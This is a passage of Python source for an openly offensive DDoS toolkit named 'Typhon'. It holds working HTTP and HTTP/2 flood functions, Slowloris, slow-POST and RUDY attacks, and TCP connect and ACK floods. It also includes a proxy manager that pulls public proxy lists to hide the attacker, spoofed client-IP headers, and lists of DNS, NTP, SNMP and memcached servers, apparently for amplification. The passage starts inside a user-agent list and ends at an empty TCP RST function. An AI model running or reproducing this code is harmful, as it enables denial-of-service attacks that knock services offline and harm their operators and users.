    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.8 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.7 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    
    # Mobile — Android Chrome
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-F946B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-F946U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-F946B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-F946U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    
    # Mobile — Android Firefox
    "Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:119.0) Gecko/119.0 Firefox/119.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:118.0) Gecko/118.0 Firefox/118.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:117.0) Gecko/117.0 Firefox/117.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:116.0) Gecko/116.0 Firefox/116.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:115.0) Gecko/115.0 Firefox/115.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:119.0) Gecko/119.0 Firefox/119.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:118.0) Gecko/118.0 Firefox/118.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:117.0) Gecko/117.0 Firefox/117.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:116.0) Gecko/116.0 Firefox/116.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:115.0) Gecko/115.0 Firefox/115.0",
]

# ============================================================
# REFERENCE DATA — DNS, NTP, SNMP Servers
# ============================================================

DNS_RESOLVERS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", 
    "9.9.9.9", "149.112.112.112", "208.67.222.222", "208.67.220.220",
    "4.2.2.1", "4.2.2.2", "4.2.2.3", "4.2.2.4",
    "76.76.2.0", "76.76.10.0", "185.228.168.9", "185.228.169.9"
]

NTP_SERVERS = [
    "0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org", "3.pool.ntp.org",
    "time.google.com", "time.apple.com", "time.windows.com",
    "ntp.ubuntu.com", "pool.ntp.org", "us.pool.ntp.org", "europe.pool.ntp.org"
]

SNMP_SERVERS = [
    "udp://snmp.net:161", "udp://snmp1.net:161", "udp://snmp2.net:161",
    "udp://snmp3.net:161", "udp://snmp4.net:161", "udp://snmp5.net:161"
]

MEMCACHED_SERVERS = [
    "udp://memcached1.net:11211", "udp://memcached2.net:11211",
    "udp://memcached3.net:11211", "udp://memcached4.net:11211"
]

# ============================================================
# LOGGING & DEBUG
# ============================================================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(config.log_file),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("Typhon")

# ============================================================
# GLOBALS
# ============================================================

proxies = []
ua = USER_AGENTS
attack_running = False
active_threads = []
proxy_manager = None
attack_stats = {
    "total_requests": 0,
    "successful_requests": 0,
    "failed_requests": 0,
    "bytes_sent": 0,
    "active_threads": 0,
    "start_time": None,
    "end_time": None
}
stats_lock = threading.Lock()

# ============================================================
# SIGNAL HANDLING
# ============================================================

def signal_handler(sig, frame):
    global attack_running
    print(f"\n{Fore.YELLOW}[!] Interrupt received. Cleaning up...{Style.RESET_ALL}")
    attack_running = False
    if proxy_manager:
        proxy_manager.stop()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ============================================================
# COLORAMA INIT
# ============================================================

init(convert=True, autoreset=True)

# ============================================================
# BANNER & UI FUNCTIONS
# ============================================================

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_main_banner():
    clear()
    banner = f"""
{Fore.RED}                                                                                   
{Fore.RED}  {Fore.CYAN}████████╗██╗   ██╗██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗{Fore.RED}                   
{Fore.RED}  {Fore.CYAN}╚══██╔══╝╚██╗ ██╔╝██╔══██╗██║  ██║██╔═══██╗████╗  ██║{Fore.RED}                   
{Fore.RED}  {Fore.CYAN}   ██║    ╚████╔╝ ██████╔╝███████║██║   ██║██╔██╗ ██║{Fore.RED}                   
{Fore.RED}  {Fore.CYAN}   ██║     ╚██╔╝  ██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║{Fore.RED}                   
{Fore.RED}  {Fore.CYAN}   ██║      ██║   ██║     ██║  ██║╚██████╔╝██║ ╚████║{Fore.RED}                   
{Fore.RED}  {Fore.CYAN}   ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝{Fore.RED}                   
{Fore.RED}                                                                                   
{Fore.RED}  {Fore.YELLOW} ⚡ ADVANCED DDoS TOOLKIT v{VERSION} ⚡{Fore.RED}                                
{Fore.RED}  {Fore.MAGENTA}🔥 25+ ATTACK METHODS • 2000+ THREADS • PROXY ROTATION{Fore.RED}          
{Fore.RED}  {Fore.GREEN}  🛡️ CLOUD BYPASS • AMPLIFICATION • REFLECTION • PROTOCOL FLOODS{Fore.RED}   
{Fore.RED}  {Fore.CYAN}   📡 LAYER 3/4/7 ATTACKS • HTTP/2 • WEBSOCKETS{Fore.RED}                     
{Fore.RED}                                                                                   
{Fore.RED}{Style.RESET_ALL}
{Fore.CYAN}            {AUTHOR} | {TEAM} | Build {BUILD}{Style.RESET_ALL}
"""
    print(banner)

def print_attack_banner(method: str, target: str, threads: int, duration: int):
    banner = f"""

{Fore.MAGENTA}  {Fore.CYAN}⚔️ ATTACK INITIATED ⚔️{Fore.MAGENTA}                                                   
{Fore.MAGENTA}  {Fore.YELLOW}Method:   {Fore.WHITE}{method}{Fore.MAGENTA}                                                      
{Fore.MAGENTA}  {Fore.YELLOW}Target:   {Fore.WHITE}{target}{Fore.MAGENTA}                                                      
{Fore.MAGENTA}  {Fore.YELLOW}Threads:  {Fore.WHITE}{threads}{Fore.MAGENTA}                                                        
{Fore.MAGENTA}  {Fore.YELLOW}Duration: {Fore.WHITE}{duration}s{Fore.MAGENTA}                                                        
{Fore.MAGENTA}  {Fore.YELLOW}Proxies:  {Fore.WHITE}{len(proxies)} loaded{Fore.MAGENTA}                                               
{Fore.MAGENTA}{Style.RESET_ALL}
"""
    print(banner)

# ============================================================
# PROXY MANAGER
# ============================================================

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.queue = Queue()
        self.lock = threading.Lock()
        self.running = True
        self.last_refresh = 0
        self._load_local_proxies()
        self._refresh_from_sources()
        self.refresh_thread = threading.Thread(target=self._auto_refresh, daemon=True)
        self.refresh_thread.start()
        
    def _load_local_proxies(self):
        proxy_files = ['./proxy.txt', './proxies.txt', './socks4.txt', './socks5.txt']
        for pf in proxy_files:
            if os.path.exists(pf):
                try:
                    with open(pf, 'r') as f:
                        for line in f:
                            line = line.strip()
                            if line and ':' in line:
                                self.proxies.append(line)
                    logger.info(f"Loaded proxies from {pf}")
                except Exception as e:
                    logger.warning(f"Failed to load {pf}: {e}")
    
    def _fetch_source(self, source):
        try:
            response = requests.get(source, timeout=config.timeout)
            if response.status_code == 200:
                return [p.strip() for p in response.text.split('\n') if p.strip() and ':' in p]
        except:
            pass
        return []
    
    def _refresh_from_sources(self):
        sources = [
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all",
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=10000&country=all",
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://www.proxy-list.download/api/v1/get?type=socks4",
            "https://www.proxy-list.download/api/v1/get?type=socks5",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
        ]
        
        new_proxies = []
        for source in sources:
            new_proxies.extend(self._fetch_source(source))
        
        # Deduplicate and merge with local
        all_proxies = list(set(self.proxies + new_proxies))
        
        with self.lock:
            self.proxies = all_proxies
            self.queue = Queue()
            for proxy in self.proxies:
                self.queue.put(proxy)
        
        if self.proxies:
            logger.info(f"Proxy pool: {len(self.proxies)} proxies available")
        else:
            logger.warning("No proxies available — running without proxy")
    
    def _auto_refresh(self):
        while self.running:
            time.sleep(config.proxy_refresh_interval)
            self._refresh_from_sources()
    
    def get(self):
        with self.lock:
            if self.queue.empty():
                self._refresh_from_sources()
            try:
                return self.queue.get_nowait()
            except Empty:
                return None
    
    def get_batch(self, count=10):
        batch = []
        for _ in range(count):
            proxy = self.get()
            if proxy:
                batch.append(proxy)
        return batch
    
    def return_proxy(self, proxy):
        if proxy:
            self.queue.put(proxy)
    
    def return_batch(self, proxies):
        for proxy in proxies:
            if proxy:
                self.queue.put(proxy)
    
    def stop(self):
        self.running = False

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def get_target(url: str) -> dict:
    """Parse URL into target components with validation."""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    parsed = urlparse(url)
    target = {
        'uri': parsed.path or '/',
        'host': parsed.netloc,
        'scheme': parsed.scheme or 'http',
        'port': '443' if parsed.scheme == 'https' else '80'
    }
    
    if ':' in parsed.netloc:
        target['host'] = parsed.netloc.split(':')[0]
        target['port'] = parsed.netloc.split(':')[1]
    
    # Validate host
    try:
        ipaddress.ip_address(target['host'])
    except:
        # Not an IP, assume domain
        pass
    
    return target

def generate_spoofed_headers(target: dict) -> dict:
    """Generate realistic spoofed headers."""
    # Generate random IP
    ip_parts = [
        str(random.randrange(1, 223)),
        str(random.randrange(0, 255)),
        str(random.randrange(0, 255)),
        str(random.randrange(1, 254))
    ]
    if ip_parts[0] in ['10', '127', '169', '172', '192']:
        ip_parts[0] = str(random.randrange(33, 126))
    spoof_ip = '.'.join(ip_parts)
    
    return {
        'X-Forwarded-For': spoof_ip,
        'X-Real-IP': spoof_ip,
        'Client-IP': spoof_ip,
        'Via': spoof_ip,
        'X-Forwarded-Host': target['host'],
        'X-Originating-IP': spoof_ip,
        'X-Remote-IP': spoof_ip,
        'X-Remote-Addr': spoof_ip,
    }

def generate_random_payload(size: int = 1024) -> bytes:
    """Generate random payload of specified size."""
    return random._urandom(size)

def update_stats(request_type: str, bytes_sent: int = 0, success: bool = True):
    """Update attack statistics."""
    with stats_lock:
        attack_stats['total_requests'] += 1
        if success:
            attack_stats['successful_requests'] += 1
        else:
            attack_stats['failed_requests'] += 1
        attack_stats['bytes_sent'] += bytes_sent

def print_stats():
    """Print current attack statistics."""
    with stats_lock:
        total = attack_stats['total_requests']
        success = attack_stats['successful_requests']
        failed = attack_stats['failed_requests']
        bytes_sent = attack_stats['bytes_sent']
        
    if total > 0:
        success_rate = (success / total) * 100
    else:
        success_rate = 0
    
    sys.stdout.write(f"\r{Fore.CYAN} Total: {total} | Success: {success} ({success_rate:.1f}%) | Failed: {failed} | Bytes: {bytes_sent/1024/1024:.2f} MB{Style.RESET_ALL}")
    sys.stdout.flush()

def countdown(duration: int):
    """Display attack countdown with statistics."""
    start = time.time()
    last_stat_print = start
    
    while time.time() - start < duration and attack_running:
        remaining = int(duration - (time.time() - start))
        if time.time() - last_stat_print > 1.0:
            print_stats()
            last_stat_print = time.time()
        sys.stdout.write(f"\r{Fore.YELLOW} Attack running: {remaining}s remaining{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.1)
    
    print_stats()
    sys.stdout.write(f"\r{Fore.GREEN} Attack complete!{Style.RESET_ALL}\n")
    sys.stdout.flush()

# ============================================================
# LAYER 7 — HTTP/HTTPS ATTACKS
# ============================================================

def attack_http_get(url: str, duration: int, threads: int):
    """HTTP GET flood with random parameters."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        session = requests.Session()
        while time.time() < until and attack_running:
            try:
                params = {'_': str(random.randint(100000, 999999))}
                headers = {
                    'User-Agent': random.choice(ua),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                }
                response = session.get(url, params=params, headers=headers, timeout=config.timeout)
                update_stats('GET', len(response.content), response.status_code == 200)
            except:
                update_stats('GET', 0, False)
            time.sleep(random.uniform(0.001, 0.01))
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_http_post(url: str, duration: int, threads: int):
    """HTTP POST flood with random form data."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        session = requests.Session()
        while time.time() < until and attack_running:
            try:
                data = {
                    'id': random.randint(100000, 999999),
                    'name': hashlib.md5(str(random.random()).encode()).hexdigest()[:8],
                    'email': f'user{random.randint(1000,9999)}@example.com',
                    'message': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=100)),
                }
                headers = {
                    'User-Agent': random.choice(ua),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                }
                response = session.post(url, data=data, headers=headers, timeout=config.timeout)
                update_stats('POST', len(response.content), response.status_code in [200, 302, 404])
            except:
                update_stats('POST', 0, False)
            time.sleep(random.uniform(0.001, 0.01))
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_http_head(url: str, duration: int, threads: int):
    """HTTP HEAD flood."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        session = requests.Session()
        while time.time() < until and attack_running:
            try:
                headers = {'User-Agent': random.choice(ua)}
                response = session.head(url, headers=headers, timeout=config.timeout)
                update_stats('HEAD', 0, response.status_code == 200)
            except:
                update_stats('HEAD', 0, False)
            time.sleep(random.uniform(0.001, 0.01))
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_http_put(url: str, duration: int, threads: int):
    """HTTP PUT flood with random data."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        session = requests.Session()
        while time.time() < until and attack_running:
            try:
                data = generate_random_payload(random.randint(1024, 65536))
                headers = {
                    'User-Agent': random.choice(ua),
                    'Content-Type': 'application/octet-stream',
                    'Content-Length': str(len(data)),
                }
                response = session.put(url, data=data, headers=headers, timeout=config.timeout)
                update_stats('PUT', len(data), response.status_code in [200, 201, 204])
            except:
                update_stats('PUT', 0, False)
            time.sleep(random.uniform(0.001, 0.01))
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_http_delete(url: str, duration: int, threads: int):
    """HTTP DELETE flood."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        session = requests.Session()
        while time.time() < until and attack_running:
            try:
                headers = {'User-Agent': random.choice(ua)}
                response = session.delete(url, headers=headers, timeout=config.timeout)
                update_stats('DELETE', 0, response.status_code in [200, 204])
            except:
                update_stats('DELETE', 0, False)
            time.sleep(random.uniform(0.001, 0.01))
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_http_options(url: str, duration: int, threads: int):
    """HTTP OPTIONS flood."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        session = requests.Session()
        while time.time() < until and attack_running:
            try:
                headers = {'User-Agent': random.choice(ua)}
                response = session.options(url, headers=headers, timeout=config.timeout)
                update_stats('OPTIONS', 0, response.status_code == 200)
            except:
                update_stats('OPTIONS', 0, False)
            time.sleep(random.uniform(0.001, 0.01))
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_http_patch(url: str, duration: int, threads: int):
    """HTTP PATCH flood with random data."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        session = requests.Session()
        while time.time() < until and attack_running:
            try:
                data = json.dumps({
                    'operation': 'update',
                    'field': random.choice(['name', 'email', 'status']),
                    'value': hashlib.md5(str(random.random()).encode()).hexdigest()
                })
                headers = {
                    'User-Agent': random.choice(ua),
                    'Content-Type': 'application/json',
                }
                response = session.patch(url, data=data, headers=headers, timeout=config.timeout)
                update_stats('PATCH', len(data), response.status_code in [200, 204])
            except:
                update_stats('PATCH', 0, False)
            time.sleep(random.uniform(0.001, 0.01))
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_http2_flood(url: str, duration: int, threads: int):
    """HTTP/2 flood using httpx."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        client = httpx.Client(http2=True, timeout=config.timeout)
        while time.time() < until and attack_running:
            try:
                headers = {'User-Agent': random.choice(ua)}
                response = client.get(url, headers=headers)
                update_stats('HTTP2', len(response.content), response.status_code == 200)
            except:
                update_stats('HTTP2', 0, False)
            time.sleep(random.uniform(0.001, 0.01))
        client.close()
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_http2_proxy_flood(url: str, duration: int, threads: int):
    """HTTP/2 flood with proxy rotation."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        while time.time() < until and attack_running:
            try:
                proxy_str = proxy_manager.get() if proxy_manager else None
                if proxy_str:
                    proxy_dict = {'http://': f'http://{proxy_str}', 'https://': f'http://{proxy_str}'}
                    client = httpx.Client(http2=True, proxies=proxy_dict, timeout=config.timeout)
                else:
                    client = httpx.Client(http2=True, timeout=config.timeout)
                
                headers = {'User-Agent': random.choice(ua)}
                response = client.get(url, headers=headers)
                update_stats('HTTP2P', len(response.content), response.status_code == 200)
                client.close()
                if proxy_str:
                    proxy_manager.return_proxy(proxy_str)
            except:
                update_stats('HTTP2P', 0, False)
            time.sleep(random.uniform(0.001, 0.01))
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

# ============================================================
# LAYER 7 — SLOW ATTACKS
# ============================================================

def attack_slowloris(url: str, duration: int, threads: int):
    """Slowloris — keep connections open with incomplete headers."""
    global attack_running
    target = get_target(url)
    attack_running = True
    until = time.time() + duration
    
    def worker():
        while time.time() < until and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((target['host'], int(target['port'])))
                
                if target['scheme'] == 'https':
                    s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
                
                request = f"GET {target['uri']} HTTP/1.1\r\nHost: {target['host']}\r\n"
                s.send(request.encode())
                
                # Send headers slowly
                for _ in range(random.randint(50, 200)):
                    header = f"X-{random.randint(1000,9999)}: {random.randint(1000,9999)}\r\n"
                    s.send(header.encode())
                    time.sleep(random.uniform(0.1, 1.0))
                
                s.close()
                update_stats('SLOWLORIS', 0, True)
            except:
                update_stats('SLOWLORIS', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_slowpost(url: str, duration: int, threads: int):
    """Slow POST — send data very slowly."""
    global attack_running
    target = get_target(url)
    attack_running = True
    until = time.time() + duration
    
    def worker():
        while time.time() < until and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((target['host'], int(target['port'])))
                
                if target['scheme'] == 'https':
                    s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
                
                boundary = hashlib.md5(str(random.random()).encode()).hexdigest()
                content_length = random.randint(100000, 500000)
                
                request = (
                    f"POST {target['uri']} HTTP/1.1\r\n"
                    f"Host: {target['host']}\r\n"
                    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
                    f"Content-Length: {content_length}\r\n"
                    f"User-Agent: {random.choice(ua)}\r\n\r\n"
                )
                s.send(request.encode())
                
                # Send data in small chunks
                chunks_sent = 0
                while chunks_sent < content_length and time.time() < until:
                    chunk_size = min(random.randint(1, 100), content_length - chunks_sent)
                    chunk = generate_random_payload(chunk_size)
                    s.send(chunk)
                    chunks_sent += chunk_size
                    time.sleep(random.uniform(0.01, 0.1))
                
                s.close()
                update_stats('SLOWPOST', chunks_sent, True)
            except:
                update_stats('SLOWPOST', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_rudy(url: str, duration: int, threads: int):
    """R-U-Dead-Yet — Slow form POST."""
    global attack_running
    target = get_target(url)
    attack_running = True
    until = time.time() + duration
    
    def worker():
        while time.time() < until and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((target['host'], int(target['port'])))
                
                if target['scheme'] == 'https':
                    s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
                
                # Large content length
                content_length = random.randint(100000, 1000000)
                
                request = (
                    f"POST {target['uri']} HTTP/1.1\r\n"
                    f"Host: {target['host']}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {content_length}\r\n"
                    f"User-Agent: {random.choice(ua)}\r\n\r\n"
                )
                s.send(request.encode())
                
                # Send data byte by byte
                bytes_sent = 0
                while bytes_sent < content_length and time.time() < until:
                    s.send(b'a')
                    bytes_sent += 1
                    time.sleep(random.uniform(0.05, 0.2))
                
                s.close()
                update_stats('RUDY', bytes_sent, True)
            except:
                update_stats('RUDY', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

# ============================================================
# LAYER 4 — TCP/UDP ATTACKS
# ============================================================

def attack_tcp_syn(ip: str, port: int, duration: int, threads: int):
    """TCP SYN flood."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        while time.time() < until and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                s.close()
                update_stats('SYN', 0, True)
            except:
                update_stats('SYN', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_tcp_ack(ip: str, port: int, duration: int, threads: int):
    """TCP ACK flood."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        while time.time() < until and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                s.send(b'ACK' * 1024)
                s.close()
                update_stats('ACK', 1024, True)
            except:
                update_stats('ACK', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_tcp_rst(ip: str, port: int, duration: int, threads: int):
    """TCP RST flood."""
